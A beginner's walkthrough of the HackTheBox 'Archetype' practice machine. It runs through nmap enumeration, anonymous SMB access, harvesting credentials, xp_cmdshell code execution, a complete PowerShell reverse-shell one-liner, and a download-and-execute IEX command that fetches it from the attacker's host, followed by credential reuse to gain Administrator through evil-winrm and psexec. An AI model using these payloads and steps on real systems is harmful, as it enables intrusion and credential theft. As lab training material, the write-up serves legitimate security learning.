---
title: Archetype - Starting Point Writeup 
author: Bros10
date: 2020-07-11 12:17:26 +0000
categories: [Hack-The-Box, Windows]
tags: [writing]
---

## Introduction

I decided to write this walkthrough of the initial Starting Point machine on HackTheBox (HTB) due to the fact that I was attempting to walk a friend through the first machine with the use of the "Starting Point Tutorial" created and provided by HTB themselves. However I noticed that they don't explain a lot of the commands and thought processes that they go through and their overall approach doesn't seem to be aimed at absolute beginners. So I hope that this Walkthrough will be more user friendly and you'll learn a thing or two if you've never touched HTB. 



## Setup

Before you begin following this Walkthrough you need to have setup the starting point VPN connection. Once you have followed the steps to do that just type this command into your terminal.

```bash
ping 10.10.10.27
```

If you have successfully setup your OpenVPN connection then your output should look like this: 

```bash
PING 10.10.10.27 (10.10.10.27) 56(84) bytes of data.
64 bytes from 10.10.10.27: icmp_seq=1 ttl=127 time=38.3 ms
```

Meaning that the box is responding to your pings and therefore you can begin this walkthrough. However if your output doesn't look like this then please refer to https://www.hackthebox.eu/home/start and https://www.hackthebox.eu/home/htb/access



#### Side note

Please make sure that you have begun your Starting Point OpenVPN file as the Starting Point machines and the rest of HTB machines have two different connection packs. 



## Enumeration

We begin on the Enumeration stage, Enumerating is defined as a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system. Enumeration is used to gather the following; Usernames, Group names, Hostnames, Network shares and services.



### Nmap 

To begin the initial stage we are going to be using nmap (Network Mapper), which is a command line tool that is used to discover hosts and services on a network. It does this by sending packets, which are small units of data, and analysing the responses. Based off the responses it can tell which Ports are open and what services are being run on said Ports. If you're confused about the term "Ports" then simply put, they are just Doors on a machine, which can be open, filtered or closed. If they are open, then depending on how they respond to packets, nmap will determine what services/applications are being run on the ports. Now we've finished a quick explanation of nmap we shall get down to the command:

```bash
nmap -sV -sC -oA scan 10.10.10.27
```

The `-sV` flag will probe open ports to determine service/version information, `-sC` flag will run default scripts, `-oA scan ` flag will save the output to `scan.nmap`, `scan.nmap` and `scan.xml` , allowing us to come back to the scan later on if needed, meaning we won't have to run the nmap scan again. Here is the output for said command:

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-02 18:38 BST
Nmap scan report for 10.10.10.27
Host is up (0.050s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-07-02T02:32:26
|_Not valid after:  2050-07-02T02:32:26
|_ssl-date: 2020-07-02T16:53:46+00:00; -45m18s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 38m42s, deviation: 3h07m50s, median: -45m18s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-07-02T09:53:38-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-02T16:53:40
|_  start_date: N/A
```

However something to bear in mind for future boxes is that the command above will only scan the most common 1,000 ports out of 65,535 possible ports, meaning sometimes you may not enumerate all the ports needed to complete a box. So you should always run another scan with the `-p-`flag which scans all 65,535 ports `nmap -sV -sC -p- -oA full_scan 10.10.10.27` in case there is a service running on a very high or unpopular port. 



Now that we have a simple understanding of nmap we have to begin to dissect the output produced by our original nmap scan, for this box we won't be going through the full scan due to the fact that there's no difference in output. 

```bash
135/tcp  open  msrpc        Microsoft Windows RPC #Remote Procedure Call, allows windows processes to communicate with each other. Which we could enumerate using rpcclient however isn't the case on this box.
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn #Network Basic Input Output System, allows devices on LAN to communicate with hardware and transmit data across the network. Is possible to enumerate using nbtscan however not useful in this case. 
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds #Microsoft-ds is the name given to the port 445 which is used by SMB (Server Message Block), said protocol is used for sharing resources like printers and filers over a network. But also allows users to execute commands remotely. This port is always worth enumerating using tools like smbclient and smbmap. 
1433/tcp open  ms-sql-s     Microsoft SQL Server vNext tech preview 14.00.1000 #Database manager system, this doesn't occur on every Windows box so therefore should be looked at.
```

### SMB

So now that we have a base line understanding of all the services running on all the open ports we shall begin to enumerate said services. I will begin by checking out port 445 using this command `smbclient -N -L \\\\10.10.10.27\\`. The `-N` flag means no password, which will only work if anonymous access has been permitted (however it's permitted more times than not), and `-L` flag will list the shares available. Output:

```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      #backup may contain some credentials of some sort 
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

So we'll attempt to get into the backups share using this command: 

```bash
smbclient -N \\\\10.10.10.27\\backups
Try "help" to get a list of possible commands.
smb: \> 
```

And we were successful, meaning we can now look around the share using a range of commands.

```bash
smb: \> dir
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020

		10328063 blocks of size 4096. 8249595 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (6.8 KiloBytes/sec) (average 6.8 KiloBytes/sec)
```

`get` will download the file into the current directory, if we `CTRL+C` out of smbclient and then `ls` we shall see the file. Let's take a look at the file.

```bash
bros@Bros10:~/Starting-point/First$ ls
prod.dtsConfig  scan.gnmap  scan.nmap  scan.xml
bros@Bros10:~/Starting-point/First$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

We now have a **Username : ARCHETYPE\sql_svc** and a **Password : M3g4c0rp123** which we will be able to use to get onto the next stage of the box. If you do some research around the `.dtsConfig` file extension you can find that it's an XML config file used to apply property values to SQL Servers. Meaning these credentials may work for the SQL server that we spotted earlier within the nmap scan. 



## Foothold

We have now moved onto the Foothold stage, as we've found out as much as we can about the machine and gathered as much information as possible. We can now attempt to get some sort of access using the credentials we've discovered. This is the stage where the majority of people give up and it's not down to the complexity of the box but more so people's lack of ability to Google, read documents and attempt various vectors.  To achieve this foothold I began to Google the terms *Pentesting Remote Microsoft SQL server* where after reading a few articles I came across this [article]( https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server) which was using an impacket script called `mssql.py`. Looking at the syntax from the article I came up with this command `mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27`

```bash
cd /usr/share/doc/python3-impacket/examples
mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami 
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure
SQL> xp_cmdshell whoami 
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL                                                                               
```

We now have Remote Code Execution (RCE), so the next stage is to get a reverse shell. A reverse shell is where the target machine, which in this case is the Windows machine initiates the connection to our machine, which is listening for incoming connections on a specific port. 

## User



Began by finding a one line PowerShell reverse shell, we shall create a file called `rshell.ps1` and copy and paste this in:

```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.x.x",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Then we will go back into a terminal to find out our IP address by running this command and then look for tun0.

```bash
bros@Bros10:~/Starting-point/First$ ip a | grep tun0
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    inet 10.10.x.x/23 brd 10.10.15.255 scope global tun0
```

When you run this command you will have values which replace both the "x", you copy and paste this IP address into the `rshell.ps1` where you replace the `10.10.x.x`. Now that you've got your reverse shell ready we need to setup a python HTTP server, use netcat to listen for an incoming connection on a specific port which we specified as 443 ( within the shell `New-Object System.Net.Sockets.TCPClient("YOUR-IP-ADDRESS",PORT)` ) and we will use the remote code execution to download the `rshell.ps1` and execute it to then finally get a reverse shell. We run all these commands within their separate terminals, so make sure that you don't close any of these terminals while doing this process.

```bash
sudo python3 -m http.server 80
[sudo] password for bros: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Above we are using Python 3 to setup a simple HTTP server, which will turn the current directory into a web server. Meaning you have to make sure that you run this command in the same directory where the `rshell.ps1` is located. To test that this has worked you can navigate to a browser and go to `http://0.0.0.0:80/` where you should then see the directory including the `rshell.ps1` file. Now we can move onto setting up a listener to listen on a port until a connection comes.

```bash
sudo rlwrap nc -lvnp 443
listening on [any] 443 ...
```

rlwrap is a program which attempts to make the reverse shell cleaner and is needed especially for a PowerShell one liner. We utilise nc which stands for netcat, which in this case is listening on TCP port 443 as we are using the `-l` tag which specifies that nc should listen for an incoming connection rather than initiate a connection, `-v` gives nc a more verbose output, `-n` means no DNS or service lookup will be performed and `-p` is used to specify the port to listen on. Both the commands above require sudo to be run due to the fact that low numbered ports are only allowed to be used and accessed by roots. 

Make sure to run this command within the terminal that has access to the MySQL server.

```bash
SQL>  xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.x.x/rshell.ps1\");"
```

Command above will utilise PowerShell and then download the file from your python simple HTTP server and also execute it. So if you've done everything correctly after you run this command you should notice this line occurs in the terminal which is hosting your HTTP server.

```bash
10.10.10.27 - - [10/Jul/2020 13:27:49] "GET /rshell.ps1 HTTP/1.1" 200 -
```

Meaning the Windows machine has downloaded the rshell.ps1 from your HTTP server, so now check your netcat terminal and you should have this line appear.

```bash
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.27] 49684
```

This means we now have a reverse shell onto the windows machine and we can test this out by entering `dir` and see if you get an output. 

```bash
cd ../../..
# dir


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/20/2020   4:20 AM                backups                                                               
d-----        9/15/2018  12:12 AM                PerfLogs                                                              
d-r---        1/19/2020   3:09 PM                Program Files                                                         
d-----        1/19/2020   3:08 PM                Program Files (x86)                                                   
d-r---        1/19/2020  10:39 PM                Users                                                                 
d-----        7/10/2020   1:52 AM                Windows

# cd Users
# dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/19/2020  10:39 PM                Administrator                                                         
d-r---        1/19/2020  10:39 PM                Public                                                                
d-----        1/20/2020   5:01 AM                sql_svc                                                               


# cd sql_svc
# dir


    Directory: C:\Users\sql_svc


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        1/20/2020   5:01 AM                3D Objects                                                            
d-r---        1/20/2020   5:01 AM                Contacts                                                              
d-r---        1/20/2020   5:42 AM                Desktop                                                               
d-r---        1/20/2020   5:01 AM                Documents                                                             
d-r---        1/20/2020   5:01 AM                Downloads                                                             
d-r---        1/20/2020   5:01 AM                Favorites                                                             
d-r---        1/20/2020   5:01 AM                Links                                                                 
d-r---        1/20/2020   5:01 AM                Music                                                                 
d-r---        1/20/2020   5:01 AM                Pictures                                                              
d-r---        1/20/2020   5:01 AM                Saved Games                                                           
d-r---        1/20/2020   5:01 AM                Searches                                                              
d-r---        1/20/2020   5:01 AM                Videos                                                                


# cd Desktop
# dir


    Directory: C:\Users\sql_svc\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/25/2020   6:37 AM             32 user.txt                                                              


# type user.txt
3e7b #This string will be longer however not putting the entire string here
```

For Windows HackTheBox machines all the users flags will be located in `C:\Users\USER-ACCOUNT\Desktop\user.txt` .



## Root

We have now obtained the user flag, so the next step is Privilege escalation. Which is the act of exploiting a bug or a misconfiguration of an application to elevate our account from **sql_svc** to **Administrator**. This aspect can be very hard and daunting at the start, as you'll have no idea about how and where to start. However there are loads of great resources which have detailed checklists for both [Linux]([https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Privilege Escalation.md)) and [Windows]([https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md)) Privilege escalation. 



After doing a bit of enumeration I found the `C:/backups` folder which was the SMB share, there's a chance that the Administrator created that backup using a command called net. When using the net command as a non-admin user you've got to provide the Administrator username and Password to allow you to create a network share. Therefore in the PowerShell history file their command may have been saved and we could obtain credentials through that way. So we run this command: 

```bash
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# Output
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

So our theory was correct and we have obtained both a **Username : Administrator** and a **Password : MEGACORP_4dm1n!!**

However checking the console history file isn't something you'll know if this is your first box. One way that you may have found these credentials was using a Windows Privilege Escalation checker called [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS). You would be able to get winPEAS onto the box using a simple HTTP server to host the winPEAS.exe file and then this PowerShell command: 

```powershell
powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.x.x/winPEAS.exe\");
```

However in some cases this won't work or you won't be able to find out where the file downloaded to, so you can try other attempts which are discussed in this [blog](https://blog.ropnop.com/transferring-files-from-kali-to-windows/) post.

 

After running winPEAS you get a large output but right at the end you see this:

```power
  [+] Searching known files that can contain creds in home(T1083&T1081)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\Administrator\Application Data\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    C:\Users\Administrator\Application Data\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Now that we have obtained credentials for Administrator we need to move onto getting a shell as Administor. We have two ways to said Shell, one of them is using a Ruby tool called Evil-winRM which utilises the WinRM (Windows Remote Management) protocol.

```bash
bros@Bros10:~/Starting-point/First/www$ evil-winrm -i 10.10.10.27 -u administrator -p 'MEGACORP_4dm1n!!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Or use another impacket tool called psexec, which is a tool that allows you to process remotely using users credentials. 

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file hXWYzzhw.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service vQBV on 10.10.10.27.....
[*] Starting service vQBV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

Using both methods you just have to navigate to `C:\Users\Administrator\Desktop\root.txt`

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2020   6:36 AM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b91cc
```



## Conclusion

In conclusion we abused the fact that we could access an SMB share through NULL authentication, discovered some credentials which allowed us to access the SQL server. From there we managed to get Remote Code Execution via the SQL server allowing us to use PowerShell to download a PowerShell reverse shell, once we obtained a shell we noticed that the PowerShell history text file has some credentials inside the files. Ended up being the password for the Administrator account, allowing us to then Evil-winRM in or use psexec. 



